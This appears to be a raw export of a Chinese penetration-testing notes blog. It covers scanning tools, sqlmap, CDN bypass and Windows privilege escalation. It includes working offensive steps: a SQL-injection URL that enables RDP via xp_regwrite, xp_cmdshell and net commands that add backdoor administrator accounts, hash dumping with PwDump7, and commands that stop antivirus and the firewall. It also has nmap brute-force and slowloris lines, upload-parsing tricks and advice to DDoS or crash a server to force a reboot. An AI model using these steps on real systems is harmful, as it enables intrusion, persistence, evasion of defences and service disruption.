10.0.0.0/8 （扫描10.x.x.x子网，扫描端口80和8000-8100范围的端口段） 获取Banner1copymasscan 10.0.0.0/8 -p80 --banners --source-ip x.x.x.x 扫描10.x.x.x网段80端口的开放信息，并且获取banner信息。–source-ip 是指定源IP，这个ip必须指定独立有效的IP地址。 设置扫描时忽略一些网段1copymasscan 0.0.0.0/0 -p0-65535 --excludefile exclude.txt 输出到指定文件中1copymasscan 0.0.0.0/0 -p0-65535 -oX scanRes.xml 设置扫描速度1copymasscan 0.0.0.0/0 -p0-65535 --max-rate 100000 命令行模式详细参数 &lt;ip&#x2F;range&gt; IP地址范围，有三种有效格式，1、单独的IPv4地址 2、类似”10.0.0.1-10.0.0.233”的范围地址 3、CIDR地址 类似于”0.0.0.0&#x2F;0”，多个目标可以用都好隔开 -p &lt;ports,–ports &gt; 指定端口进行扫描 –banners 获取banner信息，支持少量的协议 –rate 指定发包的速率 -c , –conf 读取配置文件进行扫描 –echo 将当前的配置重定向到一个配置文件中 -e , –adapter 指定用来发包的网卡接口名称 –adapter-ip 指定发包的IP地址 –adapter-port 指定发包的源端口 –adapter-mac 指定发包的源MAC地址 –router-mac 指定网关的MAC地址 –exclude &lt;ip&#x2F;range&gt; IP地址范围黑名单，防止masscan扫描 –excludefile 指定IP地址范围黑名单文件 –includefile，-iL 读取一个范围列表进行扫描 –ping 扫描应该包含ICMP回应请求 –append-output 以附加的形式输出到文件 –iflist 列出可用的网络接口，然后退出 –retries 发送重试的次数，以1秒为间隔 –nmap 打印与nmap兼容的相关信息 –http-user-agent 设置user-agent字段的值 –show [open,close] 告诉要显示的端口状态，默认是显示开放端口 –noshow [open,close] 禁用端口状态显示 –pcap 将接收到的数据包以libpcap格式存储 –regress 运行回归测试，测试扫描器是否正常运行 –ttl 指定传出数据包的TTL值，默认为255 –wait 指定发送完包之后的等待时间，默认为10秒 –offline 没有实际的发包，主要用来测试开销 -sL 不执行扫描，主要是生成一个随机地址列表 –readscan 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式. –connection-timeout 抓取banners时指定保持TCP连接的最大秒数，默认是30秒。","categories":[],"tags":[]},{"title":"","slug":"docker部署","date":"2024-03-15T07:05:53.969Z","updated":"2024-03-15T08:03:02.956Z","comments":true,"path":"2024/03/15/docker部署/","permalink":"http://example.com/2024/03/15/docker%E9%83%A8%E7%BD%B2/","excerpt":"","text":"docker一键安装部署AWVS1234copydocker pull quay.io/hiepnv/acunetix:15.2 &amp;&amp; docker volume create acunetix_data &amp;&amp; docker run -d -p 3443:3443 --restart=unless-stopped --name=acunetix_web quay.io/hiepnv/acunetix用户名：admin@acu.com密码：Passw0rd!https://localhost:3443/#/login Nessus1234567891011copydocker run -itd --name=ramisec_nessus -p 8834:8834 ramisec/nessus#更新docker exec -it ramisec_nessus /bin/bash /nessus/update.sh#更改密码docker exec -it ramisec_nessus bash# 进入这个目录cd /opt/nessus/sbin# 列出登录用户nessuscli lsuser# 修改指定用户的密码（以admin为例）nessuscli chpasswd admin 佩奇文库1234copydocker search peiqipeiqidocker pull peiqipeiqi/peiqi_wiki:220420docker run -t -d -p 65534:80 --name &quot;PeiQi_Wiki&quot; peiqipeiqi/peiqi_wiki:220420User/Pass: peiqi:peiqi (手动更新:进入Docker执行命令，/usr/share/nginx/html/synchronous.sh) 国内镜像Docker中国区官方镜像https://registry.docker-cn.com中国科学技术大学https://docker.mirrors.ustc.edu.cn 网易 http://hub-mirror.c.163.com腾讯https://mirror.ccs.tencentyun.com 反弹shell12docker build -t reverse_shell_generator .docker run -d -p 80:80 reverse_shell_generator mklink &#x2F;J “C:\\Program Files\\Docker” “D:\\software\\Docker”mklink &#x2F;J “C:\\Users\\Lenovo\\AppData\\Local\\Docker” “D:\\Users\\Lenovo\\AppData\\Local\\Docker”","categories":[],"tags":[]},{"title":"","slug":"nslookup学习笔记","date":"2024-03-15T07:05:09.688Z","updated":"2024-03-15T07:05:40.194Z","comments":true,"path":"2024/03/15/nslookup学习笔记/","permalink":"http://example.com/2024/03/15/nslookup%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"nslookup命令笔记1234567891011copy1.主机记录（A记录）： A记录是用于名称解析的重要记录，提供标准的主机名到IP的地址映射。2.别名记录（CNAME记录）： 向查询的主机提供主机名对应的规范主机名。3.域名服务器记录（NS记录）： 用来指定该域名由哪个DNS服务器来进行解析。 您注册域名时，总有默认的DNS服务器，每个注册的域名都是由一个DNS域名服务器来进行解析的，DNS服务器NS记录地址一般以以下的形式出现： ns1.domain.com、ns2.domain.com等。简单的说，NS记录返回域中主机IP地址的权威DNS服务器的主机名。4.邮件交换记录（MX记录）： 返回别名为Name对应的邮件服务器的规范主机名。 5.soa soa叫做起始授权机构记录，主dns服务器 nslookup 查询a记录1copynslookup -type=a xxxxx nslookup 查询soa记录1copynslookup -type=soa xxx nslookup 查询域传送漏洞123copynslookupserver 主dns服务器地址ls xxx dig123456copy1.查询a记录 dig xxx a2.查询soa记录 dig xxx soa3.查询域传送漏洞 dig axfr @主dns服务器地址 xxx 查询是否dnshttps：&#x2F;&#x2F;ping.chinaz.com&#x2F;","categories":[],"tags":[]},{"title":"","slug":"shadow","date":"2024-03-15T07:01:44.125Z","updated":"2024-03-15T07:02:14.557Z","comments":true,"path":"2024/03/15/shadow/","permalink":"http://example.com/2024/03/15/shadow/","excerpt":"","text":"123wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.shchmod +x shadowsocks.sh 1bash &lt;(wget -qO- https://raw.githubusercontent.com/sing-web/x-ui/main/install_CN.sh)","categories":[],"tags":[]},{"title":"","slug":"学习笔记","date":"2024-02-26T02:26:03.456Z","updated":"2021-12-15T07:57:41.542Z","comments":true,"path":"2024/02/26/学习笔记/","permalink":"http://example.com/2024/02/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"doss攻击 使用防火墙，处理非正常三次握手 cc攻击 代理 用来消耗服务器资源的 12345678C:\\Users\\86157&gt;tasklist|findstr &quot;18424&quot;java.exe 18424 Console 2 1,851,656 KC:\\Users\\86157&gt;taskkill /f /t /im java.exe成功: 已终止 PID 5284 (属于 PID 18424 子进程)的进程。成功: 已终止 PID 2320 (属于 PID 14516 子进程)的进程。成功: 已终止 PID 18424 (属于 PID 14520 子进程)的进程。成功: 已终止 PID 14516 (属于 PID 6776 子进程)的进程。 nikto -h web应用漏洞扫描器 子域名收集1234567工具： SubDomainBrute OneForAll ct-exposer Layer子域名爆破机goodle hacking intitle：xx 域名转IP判断CDN1234在线cdn检测 对于存在cdn的，需要绕过cdn查找真实的ip 1.测试真实ip的是否开放了高危端口 2.通过c段进行扫描发现其他资产 通过ip查找网段云溪cms识别12https://www.yunsee.cn/ nmap使用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162TCP: -sTSYN: -sSACK: -sAUDP: -sURPC: -sRICMP: -sPdisable port scan: -snnmap -sn -PR 192.168.0.0/24 arp扫描1.扫描包含主机列表的文件中的所有地址nmap -iL 2.扫描除了一个目标地址之外的所有地址nmap ip -exclude ip3.指定端口nmap ip -p xx4.对目标地址进行路由跟踪nmap --traceroute ip5.IIS 短文件泄露nmap -p 8080 --script http-iis-short-name-brute 192.168.1.16.拒绝服务nmap --max-parallelism 800--script http-slowloris www.cracer.com7.验证http 中开启了put 方法nmap --script http-put --script-args http-put.url=/uploads/testput.txt,http-put.file=/root/put.txt 218.19.141.168.验证MySQL 匿名访问nmap --script mysql-empty-password 203.195.139.1539.防火墙躲避-f 分片绕过-D使用诱饵隐蔽扫描NMAP -D 1.1.1.1,222.222.222.222 www.cracer.com--source-port 源端口欺骗10.对目标进行IP反查nmap -sn --script hostmap-ip2hosts www.hao123.com11.对目标DNS信息的收集nmap --script dns-brute www.test.comnmap --script dns-brute dns-brute.threads=10 www.test.com12.了解目标系统的详细信息nmap -p 445 192.168.23.1 --script membase-http-info13.检查打印服务漏洞nmap --script smb-security-mode.nse -p 445 192.168.21.314.扫描目标的xss漏洞nmap -p80 --script http-stored-xss.nse www.test.com15.扫描目标的SQL注入漏洞nmap -p8001 --script http-sql-injection.nse 192.168.0.20016.识别服务namp -sV --script unusual-port ip 17.注入脚本nmap -p8001 --script http-sql-injection.nse ip18.扫描系统漏洞nmap --script vuln 192.168.1.119.对目标地址进行HTTP头信息探测nmap -p 80 --script=http-headers test.com20.爬行web目录结构nmap -p 80 --script=http-sitemap-generator www.test.com21.Snmp服务获取目标正在运行着的服务，通过Snmp服务对目标系统的服务或账户进行列举nmap -sU -p 161 --script=snmp-win32-services 192.168.87.12922.暴力破解VNCnmap --script vnc-brute --script-args brute.guesses=6,brute.emptypass=true,userdb=/root/dictionary/user.txt,brute.useraspass=true,passdb=/root/dictionary/pass.txt,brute.retries=3,brute.threads=2,brute.delay=3 42.96.170.12823.破解telnetnmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst --script-args telnet-brute.timeout=8s 192.168.1.124.ftp弱口令暴力破解nmap --script ftp-brute --script-args brute.emptypass=true,ftp-brute.timeout=30,userdb=/root/dirtionary/usernames.txt,brute.useraspass=true,passdb=/root/dirtionary/passwords.txt,brute.threads=3,brute.delay=6 192.168.1.1 端口扫描12routescan、御剑高速TCP全端口nmap ，慢 sqlmap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113is-dba 当前用户权限dbs 所有数据库current-db 网站当前数据库users 所有数据库用户current-user 当前数据库用户tables 参数:列表名columns 参数:列字段dump 参数:下载数据--dump 获取表中的数据，包含列 --dump-all 转存DBMS数据库所有表项目--level 测试等级(1-5)，默认为1读取数据库---&gt;读取表----&gt;读取表的列----&gt;获取内容-D 指定数据库-T 指定表-C 指定列--dbms=mysql oracle mssql 指定数据库--users 枚举所有用户--passwords 枚举所有用户密码--roles 列出数据库管理员角色--privileges 列出数据库管理员权限列举数据库系统的架构sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs--level共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。-v 显示调试信息 有7个级别0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。--risk共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。从文本中获取多个目标扫描参数：-m-g测试注入Google的搜索结果中的GET参数（只获取前100个结果）。python sqlmap.py -g &quot;inurl:php?id=&quot;把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。python sqlmap.py -u “http://www.cracer.com/cracer.php” --data=“id=1”加入cookie注入测试sqlmap -u &quot;http://www.ntjx.org/jsj/DownloadShow.asp&quot; --cookie &quot;id=9&quot; --table --level 2--referersqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。--headers可以通过--headers参数来增加额外的http头--hearders “client-ip: 1.1.1.1&#x27;”--proxy使用--proxy代理是格式为：http://url:port。--proxy=http://127.0.0.1:1080--proxy-file c:/1.txt--delay可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。--timeout可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。设定重试超时--retries当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。设定随机改变的参数值--batch用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。--identify-wafsqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。--check-wafWAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试--common-tables当使用--tables无法获取到数据库的表时，可以使用此参数。通常是如下情况：1、MySQL数据库版本小于5.0，没有information_schema表。2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。3、当前用户没有权限读取系统中保存数据结构的表的权限。暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。--time-sec当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒--sql-query=&quot;select @@version&quot;--sql-shellsqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。从数据库服务器中读取文件参数：--file-read当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。参数：--file-write,--file-dest当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。--os-cmd,--os-shell当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。cmd 执行cmd命令（win）shell 执行当前用户命令 --os-shell自动上传 脚本文件返回shell searchsploit 漏洞缓存库它将搜索所有的漏洞和shellcode。 1234567891011121314151617181920212223242526apt-get install searchsploit1.查找windows本地提权漏洞searchsploit -t windows local-m可以将脚本复制到当前路径基本搜索会同时匹配标题和路径中的内容如:searchsploit smb windows remote标题搜索标题搜索只匹配标题,不会对路径中的关键词进行匹配如:searchsploit -t smb windows remote删除不想要的结果使用--exclude=选项删除不想要的结果如:searchsploit smb windows remote --exclude=&quot;(POC)|txt&quot;利用管道输出(删除不想要的结果的另一种方法)如:searchsploit smb windows remote | grep rb 只显示rb文件复制到剪贴板-p参数可以获取更多关于该漏洞的信息,以及将完整的路径复制到剪贴板上(如果可能的话)如:searchsploit -p 42315.py复制到文件夹不建议在本地的漏洞数据库中修改exp,建议使用-m参数复制那些有用的到当前的工作目录如:searchsploit -m 42315.py联网搜索一些开发的元数据没有保存在本地，如果要访问他们，需要联网搜索如:searchsploit eternalblue -w XRAY使用其他工具爬取，xray爬取速度慢 cmd 命令被动扫描 123456789101112131415161718 1.使用基础爬虫爬取爬虫爬取的链接进行漏洞扫描xray webscan --basic-crawler http://example.com --html-output vuln.html 2.使用HTTP代理进行被动扫描xray webscan --listen 127.0.0.1:7777 --html-output proxy.html设置浏览器http代理为http://127.0.0.1:7777，就可以自动分析代理流量并扫描。浏览下载https流量，请阅读世界文档抓取 https 流量部分 3.只扫描一个网址，不使用爬虫xray 网络扫描 --url http://example.com/ ? a=b --html-output single-url.html 4.手动指定本次运行的插件默认情况下，将会启用所有内置插件，可以使用以下命令指定本次扫描的插件。xray webscan --plugins cmd-injection,sqldet --url http://example.comxray webscan --plugins cmd-injection,sqldet --listen 127.0.0.1:7777 5.指定插件输出可以指定将本次扫描的漏洞信息输出到某个文件中：xray 网络扫描 --url http://example.com/ ? a=b \\--text-output result.txt --json-output result.json --html-output report.html 配合burp12341.使用HTTP代理进行被动扫描xray webscan --listen 127.0.0.1:7777 --html-output proxy.html2.exp.py3.burn监听7777 GOBY1配合xray，msf使用 设置代理 扫内网的漏洞 BURP1234~~~~## 上传，解析漏洞 IIS 5.x&#x2F;6.0解析漏洞IIS 6.0解析利用方法有两种1.目录解析&#x2F;xx.asp&#x2F;xx.jpg2.文件解析cracer.asp;.jpg ###iis 7.0以上#####&#x2F;.php apache解析漏洞x.php.xxxxPhtmlPhp3Php4php5X.phtmlPhp空格Php_PHP 在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:&lt;FilesMatch “*.jpg “&gt; SetHandler application&#x2F;x-httpd-php 然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件 Nginx 空字节代码执行漏洞影响版:0.5.,0.6., 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37Nginx在图片中嵌入PHP代码然后通过访问xxx.php%00.jpg来执行其中的代码 Nginx文件名逻辑漏洞(CVE-2013-4547)受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x正常上传一个附加代码的图片”test.jpg”，访问时后面+”空格”+”\\0”+”.php”，即让图片作为php文件解析“&#x2F;test.jpg \\0.php“Test.jpg&#x2F;.php nginx畸形解析漏洞默认fast-cgi开启状况下，在一个文件路径后面加上&#x2F;xx.php会将原来的文件解析为php文件将shell语句，如","categories":[],"tags":[]},{"title":"CDN学习笔记","slug":"CDN绕过","date":"2024-02-26T02:25:33.735Z","updated":"2024-03-15T07:11:53.050Z","comments":true,"path":"2024/02/26/CDN绕过/","permalink":"http://example.com/2024/02/26/CDN%E7%BB%95%E8%BF%87/","excerpt":"","text":"CDN学习笔记1CDN即内容分发网络，起初是为了提高网络的通讯效率，后被用于IP的隐藏技术。 CDN绕过方法1234567891011121314151617181. dns解析 使用nslookup 网址 ip2. 不同的ip地域多次ping 有些CDN可能只对国内的IP加装了CDN流量分发，而没有对其他地域加CDN3. 使用搜索引擎 shoda，钟馗，qianx4. rss订阅搜寻5. zmap https://linux.cn/article-5860-1.html6. 网站证书查询，whois挖掘全面域名相关信息 网址查询参考： 真实IP查询：https://www.ipip.net/ip.html 超级ping检测是否存在cdn：https://ping.aizhan.com/ 站长超级ping检测：http://ping.chinaz.com/ 网站数据挖掘参考：https://sitereport.netcraft.com/ 端口多种检测，IP查询参考：https://viewdns.info/ cdn检测地域范围：http://www.17ce.com/ 指纹信息查询：http://finger.tidesec.com/","categories":[],"tags":[]},{"title":"提权学习笔记收录","slug":"提权","date":"2024-02-26T02:25:19.103Z","updated":"2022-04-08T17:10:01.963Z","comments":true,"path":"2024/02/26/提权/","permalink":"http://example.com/2024/02/26/%E6%8F%90%E6%9D%83/","excerpt":"","text":"web提权1234567891011121314151617181920212223242526272829303132333435363738394041424344451.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:windowstempcookiesnet1.exe user2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以。4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。6.c:windowstempcookies 这个目录7.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！8.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:RECYCLERpr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”9.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。10.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。11.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程12.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。13.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。14.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。15. 当可读可写目录存在空格的时候，会出现这样的情况：’C:Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:Documents and SettingsAll UsersApplication DataMicrosoft 目录然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～16.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators17.进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin18.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:xxxexp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。19.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，20.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:windowstempcookiesPwDump7.exe &gt;1.txt21.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:windowstempcmd.exe 设置终端路径为：c:windowstempcmd.exe22.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:windowstempcookiescscript.exe” d:webiispwd.vbs23.如何辨别服务器是不是内网？192.168.x.x 172.16.x.x 10.x.x.x dos命令大全12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364查看版本：ver查看权限：whoami查看配置：systeminfo查看用户：net user查看进程：tasklist查看正在运行的服务：tasklist /svc查看开放的所有端口：netstat -ano查询管理用户名：query user查看搭建环境：ftp 127.0.0.1查看指定服务的路径：sc qc Mysql添加一个用户：net user jianmei daxia.asd /add提升到管理权限：net localgroup administrators jianmei /add添加用户并提升权限：net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add查看制定用户信息：net user jianmei查看所有管理权限的用户：net localgroup administrators加入远程桌面用户组：net localgroup “Remote Desktop Users” jianmei /add突破最大连接数：mstsc /admin /v:127.0.0.1删除用户：net user jianmei /del删除管理员账户:net user administrator daxia.asd更改系统登陆密码：net password daxia.asd激活GUEST用户：net user guest /active:yes开启TELNET服务：net start telnet关闭麦咖啡：net stop “McAfee McShield”关闭防火墙：net stop sharedaccess查看当前目录的所有文件：dir c:windows查看制定文件的内容：type c:windows1.asp把cmd.exe复制到c:windows的temp目录下并命名为cmd.txt：copy c:windowstempcookiescmd.exe c:windowstempcmd.txt开3389端口的命令：REG ADD HKLMSYSTEMCurrentControlSetControlTerminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f查 看补丁：dir c:windows&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt SQL语句直接开启338912345678910111213141516173389登陆关键注册表位置：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\DenyTSConnections其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。开启3389的SQL语句：syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\\CurrentControlSet\\Control\\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–关闭3389的SQL语句：syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\\CurrentControlSet\\Control\\Terminal Server ’,’fDenyTSConnections’,’REG_DWORD’,1;– 常见杀软123456789360tray.exe 360实时保护ZhuDongFangYu.exe 360主动防御KSafeTray.exe 金山卫士McAfee McShield.exe 麦咖啡SafeDogUpdateCenter.exe 服务器安全狗 windows提权中敏感目录和敏感注册表的利用12345678910111213141516171819敏感目录 目录权限 提权用途C:Program Files 默认用户组users对该目录拥有查看权 可以查看服务器安装的应用软件C:Documents and SettingsAll Users「开始」菜单程序 Everyone拥有查看权限 存放快捷方式，可以下载文件，属性查看安装路径C:Documents and SettingsAll UsersDocuments Everyone完全控制权限 上传执行cmd及expC:windowssystem32inetsrv Everyone完全控制权限 上传执行cmd及expC:windowsmy.iniC:Program FilesMySQLMySQL Server 5.0my.ini 默认用户组users拥有查看权限 安装mysql时会将root密码写入该文件C:windowssystem32 默认用户组users拥有查看权限 Shift后门一般是在该文件夹，可以下载后门破解密码C:Documents and SettingsAll Users「开始」菜单程序启动 Everyone拥有查看权限 可以尝试向该目录写入vbs或bat，服务器重启后运行。C:RECYCLERD:RECYCLER Everyone完全控制权限 回收站目录。常用于执行cmd及expC:Program FilesMicrosoft SQL Server 默认用户组users对该目录拥有查看权限 收集mssql相关信息，有时候该目录也存在可执行权限C:Program FilesMySQL 默认用户组users对该目录拥有查看权限 找到MYSQL目录中user.MYD里的root密码C:oraclexe 默认用户组users对该目录拥有查看权限 可以尝试利用Oracle的默认账户提权C:WINDOWSsystem32config 默认用户组users对该目录拥有查看权限 尝试下载sam文件进行破解提权C:Program FilesGeme6 FTP ServerRemote AdminRemote.ini 默认用户组users对该目录拥有查看权限 Remote.ini文件中存放着G6FTP的密码c:Program FilesRhinoSoft.comServ-Uc:Program FilesServ-U 默认用户组users对该目录拥有查看权限 ServUDaemon.ini 中存储了虚拟主机网站路径和密码c:windowssystem32inetsrvMetaBase.xml 默认用户组users对该目录拥有查看权限 IIS配置文件C:tomcat5.0confresin.conf 默认用户组users对该目录拥有查看权限 Tomat存放密码的位置C:ZKEYSSetup.ini 默认用户组users对该目录拥有查看权限 ZKEYS虚拟主机存放密码的位置 **提权中的敏感注册表位置 **123456789101112HKEY_LOCAL_MACHINESOFTWAREMicrosoftMSSQLServerMSSQLServerSuperSocketNetLibTcp Mssql端口HKLMSYSTEMCurrentControlSetControlTerminal Server DenyTSConnections 远程终端 值为0 即为开启HKEY_LOCAL_MACHINESOFTWAREMySQL AB mssql的注册表位置HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG 华众主机注册表配置位置HKEY_LOCAL_MACHINESOFTWARECat SoftServ-UDomains1UserList serv-u的用户及密码（su加密）位置HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminalServer WinStationsRDP-Tcp 在该注册表位置PortNumber的值即位3389端口值HKEY_CURRENT_USERSoftwarePremiumSoftNavicatServers mysql管理工具Navicat的注册表位置，提权运用请谷歌HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParameters Radmin的配置文件，提权中常将其导出进行进行覆盖提权HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual Roots IIS注册表全版本泄漏用户路径和FTP用户名漏洞HKEY_LOCAL_MACHINEsoftwarehzhostconfigSettingsmastersvrpass 华众主机在注册表中保存的mssql、mysql等密码HKEY_LOCAL_MACHINESYSTEMLIWEIWENSOFTINSTALLFREEADMIN11 星外主机mssql的sa账号密码，双MD5加密HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual RootsControlSet002 星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003 **wscript.shell的删除和恢复 **1234567载wscript.shell对象，在cmd下或直接运行：regsvr32 /u %windir%system32WSHom.Ocx卸载FSO对象，在cmd下或直接运行：regsvr32.exe /u %windir%system32scrrun.dll卸载stream对象，在cmd下或直接运行：regsvr32 /s /u “C:ProgramFilesCommonFilesSystemadomsado15.dll”如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了 如何找到准确的终端连接端口？1234567891011在aspx大马里，点击“系统信息”第三个就是目前的3389端口或是执行命令查看正在运行的服务：tasklist /svc找到：svchost.exe 1688 TermService记住1688这个ID值，查看开放的所有端口：netstat -ano找到1688这个ID值所对应的端口就是3389目前的端口 **iis6提权提示Can not find wmiprvse.exe的突破方法 **1234567891011121314151617181920windows2003 iis6iis7在windows2008以上突破方法一：在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。突破方法二：虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。 **本地溢出提权 **1234567计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令. sa提权 -windows。。sqlserver只能用于windows12345678910扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB–输入帐号密码连接即可增加一个用户：exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd /add’;–提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei /add’;–PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’) root提权 –windows&#x2F;linux123456789101112131415161718192021222324252627利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码如何判断一台windows服务器上的mysql有没有降权？cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql 